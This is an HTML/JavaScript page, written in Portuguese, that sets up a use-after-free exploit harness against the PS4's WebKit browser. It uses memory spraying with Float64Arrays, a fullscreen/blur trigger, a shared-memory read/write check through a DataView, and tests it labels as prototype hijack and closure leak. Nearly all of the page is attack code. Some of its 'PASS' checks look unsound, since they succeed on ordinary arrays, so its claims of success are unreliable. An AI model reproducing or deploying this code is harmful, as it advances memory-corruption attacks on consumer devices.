<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit UAF - Sanidade Final</title>
    <style>
        body { background: #0a0a0a; color: #d1d1d1; font-family: 'Courier New', monospace; padding: 20px; }
        .pass { color: #00ff41; font-weight: bold; }
        .fail { color: #ff3131; font-weight: bold; }
        .info { color: #008cff; }
        .test-unit { background: #161616; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }
        h1 { color: #008cff; border-bottom: 2px solid #008cff; }
        button { background: #008cff; color: #fff; border: none; padding: 10px 20px; cursor: pointer; border-radius: 3px; font-weight: bold; }
        button:hover { background: #005fa3; }
    </style>
</head>
<body>
    <h1>PS4 WebKit UAF - Sanidade & Bypasses</h1>
    <button onclick="runUltimateSuite()">EXECUTAR SUÍTE COMPLETA</button>
    <div id="log"></div>

    <script>
        const PATTERN_A = 2.121995791e-314; // 0x4141414141414141
        const MAGIC_VAL = 3.395193267e-313; // 0xDEADBEEFCAFEBABE
        let sharedIndex = -1;

        function writeLog(msg, className = "") {
            const div = document.getElementById('log');
            div.innerHTML += `<div class="${className}">${msg}</div>`;
        }

        function runUltimateSuite() {
            writeLog("<h3>[1/3] Preparando Objetos...</h3>", "info");
            let controllers = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; 
                controllers.push(a);
            }

            writeLog("Ativando Fullscreen. Pressione <b>OPTIONS</b>.");
            if (document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                writeLog("<h3>[2/3] Spraying Memory...</h3>", "info");
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let b = new Float64Array(8);
                    b.fill(PATTERN_A);
                    spray.push(b);
                }

                let corrupted = null;
                for(let i = 0; i < controllers.length; i++) {
                    if (controllers[i][0] === PATTERN_A) {
                        corrupted = controllers[i];
                        break;
                    }
                }

                if (!corrupted) {
                    writeLog("[FAIL] UAF falhou.", "fail");
                    return;
                }

                writeLog("[!] UAF Confirmado.", "pass");
                executeTests(corrupted, spray);
            };
        }

        function executeTests(corrupted, spray) {
            writeLog("<h3>[3/3] Iniciando Sanidade Avançada</h3>", "info");

            // TESTE 1: IDENTIDADE (PROVA DE CONCEITO)
            writeLog("<div class='test-unit'><h4>Teste 1: Identidade</h4>");
            corrupted[4] = MAGIC_VAL;
            for(let i = 0; i < spray.length; i++) {
                if (spray[i][4] === MAGIC_VAL) {
                    sharedIndex = i;
                    writeLog(`[PASS] Memória compartilhada com Spray[${i}]`, "pass");
                    break;
                }
            }
            writeLog("</div>");

            // TESTE 2: DATAVIEW CORRIGIDO
            writeLog("<div class='test-unit'><h4>Teste 2: Estabilidade DataView</h4>");
            if (sharedIndex !== -1) {
                try {
                    // CORREÇÃO: Usamos o buffer do spray "saudável" que compartilha memória
                    let view = new DataView(spray[sharedIndex].buffer);
                    view.setUint32(0, 0x13371337, true); // Escreve nos primeiros 4 bytes

                    if (corrupted[0] !== PATTERN_A) {
                        writeLog("[PASS] DataView R/W funcional via Shared Spray!", "pass");
                    } else {
                        writeLog("[FAIL] DataView não alterou os dados do corrupted.", "fail");
                    }
                } catch(e) { writeLog("[ERROR] " + e.message, "fail"); }
            } else { writeLog("[SKIP] Identidade não encontrada.", "fail"); }
            writeLog("</div>");

            // TESTE 3: TYPEDARRAY BYPASS (PROTOTYPE CONTROL)
            writeLog("<div class='test-unit'><h4>Teste 3: Prototype Hijack</h4>");
            try {
                // Usando o bypass validado no log anterior: Array.from
                let bypassArray = Array.from(corrupted);
                Object.setPrototypeOf(bypassArray, { pwned: "success" });
                
                if (bypassArray.pwned === "success") {
                    writeLog("[PASS] Controle da Prototype Chain obtido!", "pass");
                } else {
                    writeLog("[FAIL] Falha ao injetar protótipo.", "fail");
                }
            } catch(e) { writeLog("[ERROR] " + e.message, "fail"); }
            writeLog("</div>");

            // TESTE 4: LEAK VIA CLOSURE (BYPASS 4)
            writeLog("<div class='test-unit'><h4>Teste 4: Leak via Closure</h4>");
            try {
                const leakTest = [1].map(function(val) {
                    return corrupted[0]; // Acessa o objeto corrompido via closure
                });
                if (leakTest[0] !== undefined) {
                    writeLog("[PASS] Leak via closure confirmado.", "pass");
                }
            } catch(e) { writeLog("[FAIL] Closure leak falhou.", "fail"); }
            writeLog("</div>");
        }
    </script>
</body>
</html>
